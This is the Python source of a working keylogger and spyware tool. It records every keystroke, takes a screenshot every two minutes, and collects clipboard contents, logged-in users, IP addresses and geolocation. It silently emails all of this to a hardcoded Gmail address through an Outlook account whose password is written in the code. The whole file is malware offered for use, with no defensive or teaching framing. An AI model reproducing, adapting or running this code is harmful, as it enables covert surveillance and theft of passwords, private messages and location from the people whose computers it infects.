from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import threading
import time
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import platform
import psutil
import socket
import os
import requests
import pyperclip
from datetime import datetime
from geopy.geocoders import Nominatim


OUTPUT_FOLDER = 'output'  # Specify the folder where the text file will be saved

# Function to gather system information

SCREENSHOT_INTERVAL = 2 * 60  # 2 minutes
SYSTEM_INFO_INTERVAL = 2 * 60 * 60  # 2 hours

# Create output folder if it doesn't exist
if not os.path.exists(OUTPUT_FOLDER):
    os.makedirs(OUTPUT_FOLDER)

# Set up logging
def log_info(message):
    pass


def create_output_folder():
    # Create the output folder if it doesn't exist
    if not os.path.exists(OUTPUT_FOLDER):
        os.makedirs(OUTPUT_FOLDER)

def get_public_ip():
    try:
        # Make a GET request to a public IP detection service (ipify.org)
        response = requests.get('https://api.ipify.org?format=json')

        # If the request was successful, parse the JSON response
        if response.status_code == 200:
            data = response.json()
            return data['ip']
        else:
            return None
    except Exception as e:
        log_error(f"Error getting public IP address: {e}")
        return None

def get_location(ip):
    try:
        # Make a GET request to the ip-api.com JSON API
        response = requests.get(f'http://ip-api.com/json/{ip}')

        # If the request was successful, parse the JSON response
        if response.status_code == 200:
            data = response.json()

            # Extract relevant details from the response
            city = data['city']
            region = data['regionName']
            country = data['country']
            lat, lon = data['lat'], data['lon']

            return {
                'city': city,
                'region': region,
                'country': country,
                'latitude': lat,
                'longitude': lon
            }
        else:
            return None
    except Exception as e:
        log_error(f"Error getting location information: {e}")
        return None


def get_clipboard_text():
    try:
        return pyperclip.paste()
    except Exception as e:
        log_error(f"Error getting clipboard content: {e}")
        return None

def log_error(message):
    # Placeholder for error logging
    # print(f"Error: {message}")
    pass

def get_system_info():
    try:
        system_info_list = []

        # Basic System Information
        system_info_list.append(f"System: {platform.system()} {platform.release()}")
        system_info_list.append(f"Architecture: {platform.architecture()}")
        system_info_list.append(f"Processor: {platform.processor()}")
        system_info_list.append(f"Total RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB")
        system_info_list.append(f"Total CPU Cores: {psutil.cpu_count(logical=False)}")
        system_info_list.append(f"Total Logical CPUs: {psutil.cpu_count(logical=True)}")

        # Network Information
        host_name = socket.gethostname()
        system_info_list.append(f"Host Name: {host_name}")
        local_ip = socket.gethostbyname(host_name)
        system_info_list.append(f"Local IP Address: {local_ip}")
        public_ip = get_public_ip()
        system_info_list.append(f"Public IP Address: {public_ip}")

        # Location Information
        location_info = get_location(public_ip)
        if location_info:
            system_info_list.append(f"Location: {location_info}")

        # Logged-in Users
        logged_in_users = [user.name for user in psutil.users()]
        system_info_list.append(f"Logged-in Users: {', '.join(logged_in_users)}")

        # Clipboard Content
        clipboard_content = get_clipboard_text()
        if clipboard_content:
            system_info_list.append(f"Clipboard Content: {clipboard_content}")

        # Save system information to a text file
        system_info_text = "\n".join(system_info_list)
        file_path = os.path.join(OUTPUT_FOLDER, 'system_info.txt')
        with open(file_path, 'w') as file:
            file.write(system_info_text)

        return system_info_text
    except Exception as e:
        log_error(f"Error getting system information: {e}")
        return None
# Records only alphanumeric keystrokes and stores them in a text file
keystrokes = []

def on_press(key):
    try:
        keystrokes.append(key)
        write_file(keystrokes, 'keystrokes.txt')
    except Exception as e:
        log_error(f"Error capturing keystroke: {e}")

def write_file(data, filename):
    try:
        with open(os.path.join(OUTPUT_FOLDER, filename), "a") as f:
            for i in data:
                new_var = str(i).replace("'", "")
            f.write(new_var)
            f.write(" ")

    except Exception as e:
        log_error(f"Error writing to {filename}: {e}")

def on_release(key):
    if key == Key.esc:
        return False

# Listener function
def start_keylogger():
    try:
        log_info("Keylogger started.")
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        log_error(f"Error starting keylogger: {e}")

# Get screenshot
def screenshot():
    try:
        im = ImageGrab.grab()
        im.save(os.path.join(OUTPUT_FOLDER, "screenshot.png"))
        log_info("Screenshot saved to screenshot.png.")
    except Exception as e:
        log_error(f"Error capturing screenshot: {e}")

# Send email with attachments
def send_email(subject, body, to_email, attachments):
    try:
        from_email = 'justtry202312@outlook.com'
        password = 'Dt4T8hkE7$3Az'

        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        # Attach keystrokes.txt
        with open(os.path.join(OUTPUT_FOLDER, 'keystrokes.txt'), 'r') as keystrokes_file:
            text_attachment = MIMEText(keystrokes_file.read())
            msg.attach(text_attachment)

        # Attach screenshot.png
        with open(os.path.join(OUTPUT_FOLDER, 'screenshot.png'), 'rb') as screenshot_file:
            img_attachment = MIMEImage(screenshot_file.read(), name='screenshot.png')
            msg.attach(img_attachment)

        # Attach system_info.txt
        with open(os.path.join(OUTPUT_FOLDER, 'system_info.txt'), 'r') as system_info_file:
            system_info_attachment = MIMEText(system_info_file.read())
            msg.attach(system_info_attachment)

        with smtplib.SMTP('smtp-mail.outlook.com', 587) as server:
            server.starttls()
            server.login(from_email, password)
            server.sendmail(from_email, to_email, msg.as_string())

    except Exception as e:
        log_error(f"Error sending email: {e}")

# Function to periodically capture screenshots
def periodic_screenshots_and_keystrokes():
    try:
        while True:
            # Capture screenshot and keystrokes
            screenshot()
            attachments = ['screenshot.png', 'keystrokes.txt']
            send_email('Periodic Screenshot and Keystrokes', 'Check out this screenshot and keystrokes!', 'ggu834476@gmail.com', attachments)

            # Sleep for 2 minutes
            time.sleep(SCREENSHOT_INTERVAL)
    except Exception as e:
        log_error(f"Error capturing periodic screenshots: {e}")

# Function to send system information every 2 hours
def periodic_system_info():
    try:
        while True:
            # Get and send system information
            system_info = get_system_info()
            if system_info:
                attachments = ['system_info.txt']
                send_email('System Information', system_info, 'ggu834476@gmail.com', attachments)

            # Sleep for 2 hours
            time.sleep(SYSTEM_INFO_INTERVAL)
    except Exception as e:
        log_error(f"Error sending system information: {e}")

# Main function
def main():
    try:
        # Start keylogger in a separate thread
        keylogger_thread = threading.Thread(target=start_keylogger)
        keylogger_thread.start()

        # Start periodic screenshots and keystrokes in a separate thread
        screenshots_thread = threading.Thread(target=periodic_screenshots_and_keystrokes)
        screenshots_thread.start()

        # Start periodic system info in a separate thread
        system_info_thread = threading.Thread(target=periodic_system_info)
        system_info_thread.start()

        # Wait for the keylogger and threads to finish before exiting
        keylogger_thread.join()
        screenshots_thread.join()
        system_info_thread.join()
    except Exception as e:
        log_error(f"Main function encountered an error: {e}")

if __name__ == "__main__":
    main()
